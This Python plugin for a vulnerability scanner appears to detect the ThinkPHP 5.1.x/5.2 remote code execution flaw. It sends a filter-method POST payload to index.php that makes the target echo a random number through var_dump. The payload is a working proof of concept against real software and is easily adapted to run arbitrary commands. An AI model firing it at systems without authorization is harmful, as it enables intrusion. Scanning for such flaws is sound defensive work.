#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'thinkphp5152_rce'
        self.info = "Check the ThinkPHP 5.1.*/5.2.*(5.1.x - 5.1.31, 5.2.0beta1) RCE"
        self.keyword = ['all', 'thinkphp', 'tp', 'rce', 'web', 'danger']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        random_num = ''.join(str(i) for i in random.sample(range(0,9),4))
        check_str = 'string(4) "%s"'%(random_num)
        poc_data = "c=var_dump&f=%s&&_method=filter&"%(random_num)
        url1 = "http://%s:%d/index.php"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s/index.php"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d/index.php"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s/index.php"%(ip, int(port), add_web_path)
        for url in (url1, url2):
            try:
                req = Requester(url, method="post", data=poc_data, noencode=True)
                if check_str in req.html:
                    result = "exists ThinkPHP 5.1.*/5.2.*(5.1.x - 5.1.31, 5.2.0beta1) RCE, check url: %s, PoC: %s"%(url, poc_data)
                    self._output(ip, port, result)
                    return
            except:
                pass

globals()['VulnChecker'] = VulnChecker